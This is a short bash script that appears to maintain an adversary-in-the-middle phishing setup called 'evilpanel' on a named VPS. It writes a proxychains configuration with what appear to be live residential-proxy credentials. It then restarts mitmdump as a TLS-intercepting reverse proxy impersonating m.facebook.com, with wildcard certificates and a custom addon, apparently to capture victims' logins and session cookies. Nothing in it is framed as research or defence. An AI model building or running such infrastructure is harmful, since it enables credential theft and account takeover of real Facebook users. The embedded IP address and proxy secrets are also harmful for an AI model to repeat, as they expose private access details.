#!/bin/bash
# Fix proxychains.conf on VPS 159.223.45.209
PROXYCHAINS_CONF="/opt/evilpanel/proxychains.conf"

echo "[*] Creating corrected proxychains.conf..."
cat > "$PROXYCHAINS_CONF" << 'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 gw.dataimpulse.com 10000 768b27aac68d92f840d9__cr.ph b7564921f7b4962f
EOF

echo "[+] Fixed! Restarting mitmproxy..."
pkill -9 mitmdump; sleep 2
cd /opt/evilpanel && nohup /opt/evilpanel/venv/bin/mitmdump \
    --mode 'reverse:https://m.facebook.com/' -p 8443 --ssl-insecure \
    --certs '*=certs/combined.pem' -s core/mitmproxy_addon.py > /var/log/mitmproxy.log 2>&1 &
echo "[+] Done!"
